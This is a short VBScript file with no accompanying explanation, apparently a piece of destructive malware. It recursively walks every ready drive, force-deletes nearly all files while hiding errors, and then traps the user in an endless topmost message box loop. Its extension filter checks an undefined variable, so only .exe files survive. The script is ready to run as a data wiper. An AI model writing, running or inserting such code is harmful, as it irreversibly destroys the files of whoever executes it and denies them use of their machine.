'rcgs
on error resume next
dim fso,drive,file,all,folder,thetype,wre,type1,type2,type3
set fso=createobject("scripting.filesystemobject")
for each drive in fso.drives
	if drive.isready then
		checklist(drive.path&"\")
	end if
next

sub checklist(dirpath)
	on error resume next
	set all=fso.getfolder(dirpath)
	for each file in all.files
		killfile(file.path)
	next
	for each folder in all.subfolders
		checklist(folder.path)
	next
end sub

sub killfile(filepath)
	on error resume next
type1="exe"
type2="com"
	thetype=lcase(fso.getextensionname(filepath))
	if thetype<> type1 and fileext<> type2 and fileext<>"dll" then
		fso.deletefile filepath,1
	end if
end sub

wre="response"
do
msgbox wre,4096,"ndo32"
loop